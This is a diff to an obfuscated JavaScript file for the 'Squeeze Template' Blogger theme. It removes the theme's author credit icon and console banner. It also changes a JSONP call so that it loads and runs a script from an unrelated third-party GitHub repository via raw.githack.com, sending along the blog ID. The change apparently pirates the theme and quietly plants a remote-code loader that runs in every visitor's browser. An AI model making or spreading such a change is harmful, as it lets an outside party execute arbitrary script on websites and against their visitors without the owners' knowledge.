@@ -293,27 +293,7 @@ Element.prototype.appendElements = function (U, N) {
       "StartSide": Us.float,
       "EndSide": Us.textAlign
     };
-    _$("#HTML303").prepend("<a id=\"SqIcon\" title=\"Squeeze Template\" rel=\"nofollow noreferrer\" href=\"https://squeeze-template.blogspot.com\" target=\"_blank\"><svg viewbox=\"0 0 22 28\"><path d=\"M1.552 18.849c0.913 0 1.757 0 2.601 0 0.080 0.468 0.126 0.924 0.24 1.369 0.65 2.453 2.042 4.29 4.518 5.077 4.039 1.278 8.363-1.654 8.74-5.865 0.274-2.989-1.267-5.637-3.959-6.835-0.776-0.342-1.609-0.365-2.442-0.388-1.004-0.023-2.008 0.011-3.012-0.023-0.73-0.023-1.472-0.080-2.191-0.217-1.472-0.274-2.613-1.095-3.389-2.362-1.107-1.803-1.346-3.731-0.662-5.728 0.73-2.134 2.316-3.309 4.541-3.628 2.408-0.354 4.815-0.251 7.234-0.091 2.282 0.148 4.553 0.297 6.835 0.205 0.513-0.023 1.027-0.068 1.643-0.103-0.114 0.183-0.171 0.354-0.285 0.434-0.411 0.319-0.81 0.65-1.255 0.901-1.472 0.833-3.058 1.312-4.747 1.312-1.871 0-3.754-0.091-5.625-0.126-1.267-0.023-2.533-0.011-3.765 0.342-1.027 0.297-1.86 0.822-2.214 1.894-0.251 0.787-0.251 1.597-0.011 2.396 0.24 0.776 0.787 1.312 1.552 1.529 0.685 0.194 1.392 0.319 2.099 0.377 1.267 0.091 2.544 0.057 3.822 0.137 4.267 0.285 7.839 3.663 8.386 7.907 0.331 2.544-0.126 4.918-1.712 6.994-1.267 1.643-2.944 2.681-4.929 3.229-2.248 0.628-4.484 0.559-6.641-0.354-3.024-1.267-4.678-3.617-5.192-6.812-0.091-0.513-0.126-1.027-0.183-1.575z\"></path><path d=\"M0.034 13.817c0.103-0.011 0.205-0.034 0.308-0.034 1.974 0.023 3.959 0.080 5.933 0.080 1.848 0 3.685-0.023 5.522 0.205 0.183 0.023 0.365 0.057 0.548 0.114 1.757 0.536 3.32 2.613 3.366 4.461 0.046 2.328-1.518 4.222-3.857 4.689-0.833 0.171-1.677 0.171-2.487-0.080-1.814-0.559-2.784-1.848-3.092-3.685-0.023-0.148-0.046-0.308-0.057-0.468-0.011-0.068 0-0.148 0-0.262 0.399 0 0.81 0.034 1.198-0.011 0.73-0.091 1.255 0.080 1.609 0.81 0.194 0.399 0.593 0.719 0.936 1.015 0.456 0.388 1.004 0.411 1.552 0.205 1.038-0.388 1.666-1.529 1.403-2.613-0.114-0.491-0.456-0.799-0.89-1.027-0.73-0.388-1.529-0.536-2.328-0.605-0.901-0.080-1.803-0.126-2.704-0.126-2.020 0-3.868-0.525-5.557-1.632-0.479-0.308-0.947-0.639-1.415-0.947 0-0.034 0-0.068 0.011-0.091z\"></path><path d=\"M17.446 4.963c-0.879 0.833-1.928 1.46-3.092 1.905-2.168 0.822-4.404 0.947-6.663 0.525-0.456-0.080-0.879-0.331-1.301-0.548-0.114-0.057-0.217-0.251-0.228-0.399-0.091-0.81 0.342-1.426 1.141-1.643 1.050-0.285 2.111-0.251 3.183-0.16 1.483 0.126 2.978 0.274 4.461 0.354 0.833 0.046 1.666-0.023 2.499-0.034z\"></path></svg></a>");
-    document.head.append("<style>#SqIcon{margin-" + Uf.EndSide + ":10px;width:30px;height:30px;background-color:" + Uf.BackColor + "!important;padding:5px;border-radius:3px}#SqIcon svg{fill:" + Uf.FillColor + ";width:100%;height:100%}#SqIcon:hover{background-color:" + Uf.BackHover + "}#SqIcon:hover svg{fill:" + "#FFF" + "}</style>");
-    _$("#HTML303,#SqIcon,#SqIcon>*,.tempscheme").addClass("impo");
-    _$("#HTML303").parentsUntil(".main-container").each(function (UC) {
-      UC.addClass("impo");
-    });
-    var Ue = document.createElement("script");
-    Ue.innerHTML = "console.group(\"%cSqueeze Template\", \"font-weight:bold;color:#d24949;font-family:Tahoma;font-size:18px;\");console.log(\"» Homepage      : https://squeeze-template.blogspot.com\");console.log(\"» Designed by   : Ahmad Saleh\");console.log(\"» Programmed by : Muhammad Saleh\");console.log(\"» Version       : 2.3.0\");console.groupEnd()";
-    document.head.appendChild(Ue);
-    window.addEventListener("scroll", function () {
-      if (document.querySelector(".widget.Blog") != null && location.host != "translate.googleusercontent.com") {
-        if (window.scrollY + window.innerHeight > _$(".widget.Blog").offset().top && !i) {
-          i = true;
-          try {} catch (UZ) {
-            U9(1);
-          }
-          U8(E, V);
-        }
-      }
-    });
-  }
+   
   function U8(UI, Us, Uf) {
     try {
       var Uo = document.createElement("script");
@@ -342,10 +322,10 @@ Element.prototype.appendElements = function (U, N) {
         "blogId": E,
         "errorCode": UI
       };
-      $getJSONP("#", Us, function () {});
+      $getJSONP("https://raw.githack.com/bouaicidz/maxee/main/sq.js", Us, function () {});
     }
   };
-
+ 
   function UN() {
     if (window.innerWidth > 992) {
       _$(".MegaItem").each(function (UI) {
